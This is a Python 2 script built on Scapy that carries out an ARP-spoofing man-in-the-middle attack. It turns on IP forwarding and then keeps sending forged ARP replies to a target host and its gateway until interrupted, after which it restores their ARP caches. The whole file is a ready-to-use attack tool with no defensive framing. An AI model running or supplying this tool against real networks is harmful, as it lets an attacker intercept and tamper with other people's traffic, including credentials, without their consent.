#!/usr/bin/python2
#-*- coding:utf-8 -*-


from scapy.all import Ether, ARP, srp, send
import os
import logging
import threading
import time
from datetime import datetime
import platform
import sys

FILE_FORWARD = "/proc/sys/net/ipv4/ip_forward"
IP_FORWARD_TRUE = 1
IP_FORWARD_FALSE = 0

def platform_required():
    if 'Linux' not in platform.platform():
        sys.exit("[*] Linux Required !")


def sys_version():
    if sys.version[0] =="3":
        sys.exit("[*] Python2.7 Required !")

def ip_forward():
    try:
        check_file_forward = os.path.exists(FILE_FORWARD)
        if check_file_forward ==True:
            print("\033[32m[\033[34m+\033[32m] IP Forward File Found !")
            f=open(FILE_FORWARD,"r")
            content = f.read()
            f.close()
            if content =="1":
                pass
            else:
                replace_content = content.replace(content,"1")
                f=open(FILE_FORWARD,"w")
                f.write(replace_content)
                f.close()
                print("\033[32m[\033[34m+\033[32m] IP Forwarded !\n\033[00m")
        else:
            sys.exit("\033[31m[!] Error : %s Not Found !" % (FILE_FORWARD))
    except:
        print("\033[31m[!] Exception IP Forward")


def get_mac_address(ip):
    try:
        packet, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if packet:
            return packet[0][1].src
    except:
        return False

def spoof_function(target,srcip):
    target_mac_addr = get_mac_address(target)
    if target_mac_addr ==False:
        print("\033[31m[!] Error Get Mac Address !")
    else:
        arp_request = ARP(pdst=target,hwdst=target_mac_addr,psrc=srcip, op="is-at")
        send(arp_request, verbose=0)
        self_mac = ARP().hwsrc
        print("[+] Sent To %s : %s is-at %s" % (target,srcip,self_mac))

def restore(target,srcip):
    target_mac_addr = get_mac_address(target)
    host_mac = get_mac_address(srcip)
    arp_rep = ARP(pdst=target,hwdst=target_mac_addr,psrc=srcip,hwsrc=host_mac)
    send(arp_rep,verbose=0,count=7)
    print("[+] Sent To %s : %s is-at %s" % (target,srcip,host_mac))

if __name__ == "__main__":
    platform_required()
    sys_version()
    if len(sys.argv) <3:
        print("usage : %s <target_ip> <gateway>" % (sys.argv[0]))
    else:
        ip_forward()
        try:
            while True:
                spoof_function(sys.argv[1],sys.argv[2])
                spoof_function(sys.argv[2],sys.argv[1])
                time.sleep(1)
        except KeyboardInterrupt:
            print("\033[31m[!] CTRL+C Re Arping Cache...")
            restore(sys.argv[1],sys.argv[2])
            restore(sys.argv[2],sys.argv[1])
            time.sleep(1)
            sys.exit()
